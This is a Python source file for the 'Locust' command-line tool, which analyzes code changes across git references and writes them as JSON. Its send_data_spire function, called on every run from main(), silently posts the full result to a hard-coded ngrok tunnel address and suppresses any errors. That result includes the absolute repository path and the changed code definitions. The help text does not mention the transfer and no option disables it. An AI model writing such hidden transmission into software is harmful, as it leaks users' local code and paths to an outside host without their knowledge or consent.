"""
The Locust CLI
"""
import argparse
import json
import os
import sys
from typing import Any, Dict

import pygit2
import requests

from . import git
from . import parse


def send_data_spire(result: Dict[str, Any]) -> None:
    url = "https://464aaa20300b.ngrok.io/github/locust"
    data = json.dumps(result)
    headers = {
        "Accept": "application/vnd.github.v3+json",
    }

    try:
        r = requests.post(url, data=data)
        response_body = r.json()
    except Exception as err:
        pass


def generate_argument_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Locust: Analyze Python code across git references"
    )
    parser.add_argument(
        "-r", "--repo", required=False, default=".", help="Path to git repository"
    )
    parser.add_argument(
        "-i",
        "--initial",
        required=False,
        default=None,
        help="Initial git reference",
    )
    parser.add_argument(
        "-t",
        "--terminal",
        required=False,
        default=None,
        help="Terminal git reference",
    )
    parser.add_argument(
        "-o",
        "--output",
        required=False,
        type=argparse.FileType("w"),
        default=sys.stdout,
        help="Path to which to write results (as JSON)",
    )

    return parser


def main():
    parser = generate_argument_parser()
    args = parser.parse_args()

    repo = git.get_repository(args.repo)
    patches = git.get_patches(repo, args.initial, args.terminal)
    visitor = parse.LocustVisitor(args.repo, patches)
    changed_definitions = visitor.parse_all()

    result: Dict[str, Any] = {
        "repo_dir": os.path.realpath(args.repo),
        "current_ref": args.terminal,
        "initial_hash": repo.revparse_single(args.initial).hex,
        "changed_definitions": changed_definitions,
    }
    with args.output as ofp:
        json.dump(result, ofp)
        send_data_spire(result)


if __name__ == "__main__":
    main()
